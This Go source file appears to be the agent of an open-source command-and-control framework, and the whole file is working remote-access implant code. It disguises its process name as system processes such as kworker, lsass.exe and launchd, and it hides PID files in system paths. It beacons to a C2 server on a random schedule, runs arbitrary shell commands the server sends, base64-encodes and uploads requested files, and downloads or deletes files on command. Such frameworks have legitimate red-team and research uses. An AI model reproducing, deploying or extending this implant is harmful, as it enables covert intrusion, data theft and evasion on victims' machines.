package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/jmpsec/stanza-c2/pkg/callbacks"
	"github.com/jmpsec/stanza-c2/pkg/types"
)

const (
	// Code to request callbacks
	_callbacksCode = "ThisShouldBeSecret"
	// Env variable for the code to request callbacks
	_callbacksCodeEnv = "STZ_CALLBACKS_CODE"
	// Env variable for the callbacks endpoint
	_callbacksURLEnv = "STZ_CALLBACKS"
	// Env variable to force the agent UUID
	_callbacksUUIDEnv = "STZ_UUID"
	// Fixed min cycle value in seconds
	_cycleMin = 20
	// Env variable for cycleMin
	_cycleMinEnv = "STZ_MIN"
	// Fixed max cycle value in seconds
	_cycleMax = 60
	// Env variable for cycleMax
	_cycleMaxEnv = "STZ_MAX"
	// PID file for current process when running as root for Unix/Linux
	_pidFileU = "/var/lib/dbus/.stzpid"
	// PID file for current process when running as root for Darwin
	_pidFileD = "/Library/OSAnalytics/.stzpid"
	// PID file for current process when running as root for Windows
	_pidFileW = "C:\\system32\\wininit.dat"
	// PID file for current process when NOT running as root for Unix/Linux
	_pidTmpFileU = "/tmp/.stzpid"
	// PID file for current process when NOT running as root for Darwin
	_pidTmpFileD = "/tmp/.stzpid"
	// PID file for current process when NOT running as root for Windows
	_pidTmpFileW = "C:\\WINDOWS\\TEMP\\wininit.dat"
	// Env variable for pidFile
	_pidFileEnv = "STZ_PID"
	// Env variable to turn on debug
	_debugEnv = "STZ_DEBUG"
	// Protocol HTTPS
	_protoHTTPS = "https"
	// Protocol HTTP
	_protoHTTP = "http"
	// Protocol TCP
	_protoTCP = "tcp"
	// Protocol UDP
	_protoUDP = "udp"
)

var (
	// Endpoint to register the client
	callbacksURL string
	// Code to request for callbacks
	callbacksCode string
	// Name for agent process
	processName string
	// Hold all configuration values
	config StzConfig
	// Bottom value for the random interval in seconds
	cycleMin int
	// Ceiling value for the random interval in seconds
	cycleMax int
	// Current value to sleep in seconds
	cycleNow int
	// Path to store a PID file for current process
	pidFile string
	// State of execution to stay completely dormant
	totalSleep bool
	// Debug
	printDebug bool
	// Keep it quiet, keep it secret
	_silence bool = true
	// Fixed UUID value
	_fixedUUID = ""
)

// PotentialNamesUnix : Potential names for agent process in Unix/Linux
var PotentialNamesUnix = []string{
	"[kproc]       ",
	"[rpciod]      ",
	"[kudevd]      ",
	"[kauditd]     ",
	"[kworker:0]   ",
	"[kworker:1]   ",
	"[kworker:0]   ",
	"[kblockd/0]   ",
	"[kmirrord]    ",
	"[aio/0]       ",
}

// PotentialNamesWindows : Potential names for agent process in Windows
var PotentialNamesWindows = []string{
	"csrss.exe     ",
	"lsass.exe     ",
	"smss.exe      ",
	"spoolsv.exe   ",
	"userinit.exe  ",
	"winlogon.exe  ",
	"ctfmon.exe    ",
	"wininit.exe   ",
	"explorer.exe  ",
	"ntoskrnl.exe  ",
}

// PotentialNamesOSX : Potential names for agent process in OSX
var PotentialNamesOSX = []string{
	"/libexec/kextd",
	"autofsd       ",
	"aslmanager    ",
	"/libexec/usbd ",
	"/sbin/cupsd   ",
	"/sbin/launchd ",
	"/libexec/logd ",
	"/sbin/netbiosd",
	"/sbin/syslogd ",
	"/libexec/amfid",
}

// Function to collect all the host information to register in the C2
func gatherRegistrationData() (*types.StzRegistrationRequest, error) {
	// Get user
	u, err := user.Current()
	if err != nil {
		return &types.StzRegistrationRequest{}, err
	}
	// Get hostname
	h, err := os.Hostname()
	if err != nil {
		return &types.StzRegistrationRequest{}, err
	}
	config.Hostname = h
	config.UUID = _fixedUUID
	if _fixedUUID == "" {
		config.UUID = getUUID()
	}
	return &types.StzRegistrationRequest{
		UUID:     config.UUID,
		Hostname: config.Hostname,
		IPs:      getIPs(),
		Uname:    getUname(),
		GOOS:     runtime.GOOS,
		GOARCH:   runtime.GOARCH,
		Username: u.Username,
		CycleMin: cycleMin,
		CycleMax: cycleMax,
	}, nil
}

// Run to define command to execute
func (cmd *Worker) Run() {
	cmd.Output <- run(cmd.Command)
}

// Collect to define channel to collent output
func commandCollectDone(c chan string, callback types.StzCallback, cmdID uint) {
	for {
		cmdOutput := <-c
		confirm := types.StzExecutionStatus{
			Status: types.StzStatusDone,
			UUID:   config.UUID,
			ID:     cmdID,
			Data:   cmdOutput,
		}
		err := sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
		if err != nil && !_silence {
			log.Println(err)
		}
	}
}

// Register agent based on the existing callbacks
func agentFullRegistration() {
	// Collect information from the host
	data, err := gatherRegistrationData()
	if err != nil && !_silence {
		// This isn't good
		log.Println(err)
	}
	if printDebug && !_silence {
		log.Printf("STZ: Registration data: %+v\n\n", data)
	}
	// Iterate over all callbacks and register in all of them
	for _, cbk := range config.Callbacks {
		switch pl := cbk.Protocol; pl {
		case _protoHTTPS, _protoHTTP:
			reg, err := registerHTTPClient(cbk.Endpoints[callbacks.RegisterEndpoint], data)
			if err != nil || reg.Response != types.StzResponseOk && !_silence {
				// TODO : This should be a retry
				log.Println(err)
			}
		case _protoTCP:
			log.Fatal("STZ: Not yet implemented (tcp)")
		case _protoUDP:
			log.Fatal("STZ: Not yet implemented (udp)")
		}
	}
}

// Function to execute the commands retrieved from C2 as the beacon response
func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaconResponse) {
	if printDebug && !_silence {
		log.Println("STZ_DEBUG: Processing beacons")
	}
	// Iterate through all the pending commands
	for _, data := range dataList {
		// Confirm receiving the order
		confirm := types.StzExecutionStatus{
			Status: types.StzStatusReceived,
			UUID:   config.UUID,
			ID:     data.ID,
			Data:   "",
		}
		err := sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
		if err != nil && !_silence {
			log.Println(err)
		}
		if printDebug && !_silence {
			log.Printf("STZ_DEBUG: Received beacon %s\n", data.Action)
		}
		switch p := callback.Protocol; p {
		case _protoHTTPS, _protoHTTP:
			switch b := data.Action; b {
			case types.StzActionSet:
				// Format in data.Payload is
				// "SETTING_NAME|SETTING_VALUE"
				s := strings.Split(data.Payload, "|")
				switch s[0] {
				case _cycleMinEnv:
					newCycleMin, err := strconv.Atoi(s[1])
					if err != nil && !_silence {
						log.Println(err)
					} else {
						cycleMin = newCycleMin
					}
				case _cycleMaxEnv:
					newCycleMax, err := strconv.Atoi(s[1])
					if err != nil && !_silence {
						log.Println(err)
					} else {
						cycleMax = newCycleMax
					}
				}
				confirm := types.StzExecutionStatus{
					Status: types.StzStatusDone,
					UUID:   config.UUID,
					ID:     data.ID,
					Data:   "",
				}
				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
				if err != nil && !_silence {
					log.Println(err)
				}
			case types.StzActionExecute:
				// Create channel
				o := make(chan string)
				// Prepare worker
				command := &Worker{Command: data.Payload, Output: o}
				// Run command in goroutine
				go command.Run()
				// Collect output (stdout + stderr) and send it
				go commandCollectDone(o, callback, data.ID)
			case types.StzActionGet:
				// Format in payload is
				// "PATH_TO_GET"
				filePath := data.Payload
				fileContent, err := os.ReadFile(filePath)
				if err != nil {
					// If error reading file, send error message back to server
					confirm := types.StzExecutionStatus{
						Status: types.StzStatusDone,
						UUID:   config.UUID,
						ID:     data.ID,
						Data:   fmt.Sprintf("Error reading file: %s", err),
					}
					err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
					if err != nil && !_silence {
						log.Println(err)
					}
					return
				}
				// Encode file content in base64
				encodedContent := base64.StdEncoding.EncodeToString(fileContent)
				// Confirm command execution with encoded file content
				confirm := types.StzExecutionStatus{
					Status: types.StzStatusDone,
					UUID:   config.UUID,
					ID:     data.ID,
					Data:   encodedContent,
				}
				err = sendHTTPExecution(callback.Endpoints[callbacks.FilesEndpoint], confirm)
				if err != nil && !_silence {
					log.Println(err)
				}
			case types.StzActionPut:
				// Format in payload is
				// "FILE_URL|PATH_TO_PUT"
				s := strings.Split(data.Payload, "|")
				// Create file
				out, err := os.Create(s[1])
				if err != nil && !_silence {
					log.Println(err)
				}
				defer func() {
					err := out.Close()
					if err != nil && !_silence {
						log.Fatalf("Failed to close file %v", err)
					}
				}()
				// Download file
				resp, err := http.Get(s[0])
				if err != nil && !_silence {
					log.Println(err)
				}
				defer func() {
					err := resp.Body.Close()
					if err != nil && !_silence {
						log.Fatalf("Failed to close response Body %v", err)
					}
				}()
				// Write the body to file
				bytesCopied, err := io.Copy(out, resp.Body)
				if err != nil && !_silence {
					log.Println(err)
				}
				// Confirm the command is completed
				txtData := strconv.Itoa(int(bytesCopied)) + " bytes copied"
				confirm := types.StzExecutionStatus{
					Status: types.StzStatusDone,
					UUID:   config.UUID,
					ID:     data.ID,
					Data:   txtData,
				}
				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
				if err != nil && !_silence {
					log.Println(err)
				}
			case types.StzActionDelete:
				// Delete file
				err = os.Remove(data.Payload)
				if err != nil && !_silence {
					log.Println(err)
				}
				// Confirm the command is completed
				confirm := types.StzExecutionStatus{
					Status: types.StzStatusDone,
					UUID:   config.UUID,
					ID:     data.ID,
					Data:   "",
				}
				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
				if err != nil && !_silence {
					log.Println(err)
				}
			case types.StzActionLock:
				log.Println("Lock machine")
			case types.StzActionSleep:
				totalSleep = true
				secondsToSleep, err := strconv.Atoi(data.Payload)
				if err != nil && !_silence {
					log.Println(err)
				}
				time.Sleep(time.Second * time.Duration(secondsToSleep))
				totalSleep = false
				// Confirm the command is completed
				confirm := types.StzExecutionStatus{
					Status: types.StzStatusDone,
					UUID:   config.UUID,
					ID:     data.ID,
					Data:   "",
				}
				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
				if err != nil && !_silence {
					log.Println(err)
				}
			case types.StzActionExit:
				// Confirm the command is completed
				confirm := types.StzExecutionStatus{
					Status: types.StzStatusDone,
					UUID:   config.UUID,
					ID:     data.ID,
					Data:   "",
				}
				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
				if err != nil && !_silence {
					log.Println(err)
				}
				// kthxbai
				os.Exit(0)
			case types.StzActionRegister:
				go agentFullRegistration()
			default:
				log.Println("NO COMMANDS")
			}
		case _protoTCP:
			log.Fatal("Not yet implemented")
		case _protoUDP:
			log.Fatal("Not yet implemented")
		}
	}
}

// Function to retrieve communication callbacks from C2 using HTTP
func getCallbacks(uuid string) ([]types.StzCallback, error) {
	headers := map[string]string{
		"Content-Type": "application/json",
		"X-STZ-Verify": "Callbacks",
	}
	data := types.StzCallbacksRequest{
		UUID:           uuid,
		HelloThisIsDog: callbacksCode,
	}
	jsonOut, err := json.Marshal(data)
	if err != nil {
		return []types.StzCallback{}, err
	}
	jsonParam := strings.NewReader(string(jsonOut))
	resp, body, err := sendHTTPRequest("POST", callbacksURL, jsonParam, headers)
	if resp != http.StatusOK {
		return []types.StzCallback{}, fmt.Errorf("ERROR: HTTP %d - [%s]", resp, body)
	}
	if err != nil {
		return []types.StzCallback{}, fmt.Errorf("ERROR: [%s]", err)
	}
	// Parse response
	var rData types.StzCallbacksResponse
	err = json.Unmarshal(body, &rData)
	if err != nil {
		return []types.StzCallback{}, err
	}
	return rData.Callbacks, nil
}

// Function to prepare the callbacks URL
func prepareCallbacksURL(proto, host, port, path string) string {
	return fmt.Sprintf("%s://%s:%s/%s", proto, host, port, path)
}

func init() {
	// Check if is already running using pidfile
	var _pidFile string
	var _pidFileTmp string
	switch os := runtime.GOOS; os {
	case "darwin":
		_pidFile = _pidFileD
		_pidFileTmp = _pidTmpFileD
	case "linux":
		_pidFile = _pidFileU
		_pidFileTmp = _pidTmpFileU
	case "freebsd":
		_pidFile = _pidFileU
		_pidFileTmp = _pidTmpFileU
	case "windows":
		_pidFile = _pidFileW
		_pidFileTmp = _pidTmpFileW
	}
	pidFile = getClientEnvStr(_pidFileEnv, _pidFile)

	// Check if pidfile is present and there is a process associated
	alreadyRunning := false
	_, err := os.Stat(pidFile)
	if err == nil || !os.IsNotExist(err) {
		dat, err := os.ReadFile(pidFile)
		if err != nil && !_silence {
			log.Println(err)
		}
		pid, err := strconv.ParseInt(string(dat), 10, 64)
		//ownPid := os.Getpid()
		if err != nil && !_silence {
			log.Println(err)
		} else {
			process, err := os.FindProcess(int(pid))
			if err != nil && !_silence {
				log.Println(err)
			} else {
				err := process.Signal(syscall.Signal(0))
				if err == nil {
					alreadyRunning = true
				}
			}
		}
	}

	// Write PID file in the specified path
	if !alreadyRunning {
		writePidFile(pidFile, _pidFileTmp)
	} else {
		log.Fatal("STZ: Already running, exiting...")
	}

	// Set process name by operating system
	setProcessName()

	// cycle values
	cycleMin = getClientEnvInt(_cycleMinEnv, _cycleMin)
	cycleMax = getClientEnvInt(_cycleMaxEnv, _cycleMax)

	// callbacks communication endpoint
	callbacksURL = getClientEnvStr(_callbacksURLEnv, _callbacksURL)

	// callbacks retrieval code
	callbacksCode = getClientEnvStr(_callbacksCodeEnv, _callbacksCode)

	// Let's not have the agent fully dormant
	totalSleep = false

	// Do we want debug?
	printDebug = getClientEnvBool(_debugEnv, false)

	// Agent is silent if debug isn't enabled
	_silence = !printDebug

	// Forcing UUID
	_fixedUUID = getClientEnvStr(_callbacksUUIDEnv, "")
}

func main() {
	// Logging format flags
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Llongfile)

	// Get data for future requests
	_, err := gatherRegistrationData()
	if err != nil && !_silence {
		log.Println(err)
	}

	// Set a time in the past to request callbacks
	config.LastCallback = time.Now().Add(time.Hour * -1)

	// Agent infinite loop
	if printDebug && !_silence {
		log.Println("STZ_DEBUG: Initializing loop")
	}
	for {
		// If callbacks are old, get them again
		if time.Since(config.LastCallback).Seconds() > oneHour {
			config.LastCallback = time.Now()
			if printDebug && !_silence {
				log.Println("STZ_DEBUG: Getting callbacks")
			}
			callbacks, err := getCallbacks(config.UUID)
			if err != nil && !_silence {
				// No callbacks, dead awaits
				log.Println(err)
			}
			config.Callbacks = callbacks
			if printDebug && !_silence {
				log.Printf("STZ_DEBUG: %d callbacks [%+v]\n", len(callbacks), callbacks)
			}

			// Register with all the callbacks
			go agentFullRegistration()
		}

		// Check if we are in a dormant mode
		if totalSleep {
			continue
		}

		// Calculate the seconds to sleep
		cycleNow = randomBetween(cycleMin, cycleMax)

		// Send beacon and receive commands
		statusBeacon := types.StzBeaconStatus{
			Status:   types.StzStatusBeacon,
			UUID:     config.UUID,
			CycleNow: cycleNow,
		}
		if printDebug && !_silence {
			log.Println("STZ_DEBUG: Iterating through callbacks")
		}
		for _, cbk := range config.Callbacks {
			switch pl := cbk.Protocol; pl {
			case _protoHTTPS, _protoHTTP:
				beaconRes, err := sendHTTPBeacon(cbk.Endpoints["beacon"], statusBeacon)
				if err != nil && !_silence {
					// TODO : This should be a retry
					log.Println(err)
				}
				// Process commands using goroutines
				go processBeaconResponse(cbk, beaconRes)
			case _protoTCP:
				log.Fatal("Not yet implemented")
			case _protoUDP:
				log.Fatal("Not yet implemented")
			}
		}

		// Sleep
		if !_silence {
			log.Printf("Sleeping %d seconds...\n", cycleNow)
		}
		time.Sleep(time.Second * time.Duration(cycleNow))

		// Let's change the process name, because we can
		setProcessName()
	}
}
